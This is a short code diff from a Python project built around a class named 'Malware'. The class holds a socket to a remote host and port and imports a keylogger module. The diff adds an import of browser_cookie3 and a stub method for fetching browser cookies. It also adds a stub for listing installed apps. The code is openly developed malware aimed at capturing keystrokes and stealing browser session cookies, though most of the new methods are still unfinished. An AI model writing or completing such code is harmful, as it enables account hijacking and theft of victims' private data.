@@ -8,14 +8,22 @@ import sys
 from keylogging import *
 from keylogging import keylogger
 from subprocess import call
+import browser_cookie3
 # from colorama import Fore, Style
-
 
 class Malware:
     def __init__(self,host,port):
         self.HOST = host
         self.PORT = port
         self.sock = st.socket(st.AF_INET, st.SOCK_STREAM)
+
+    def get_all_apps(self):
+        pass
+
+    def get_browser_cookies(self):
+        fetch_cookies = browser_cookie3
+        #fistlty look for available browsers and load to fetch
+
 
     def get_network_infos(self):
         ip = 'x-x-x-x-x-x-x-x'
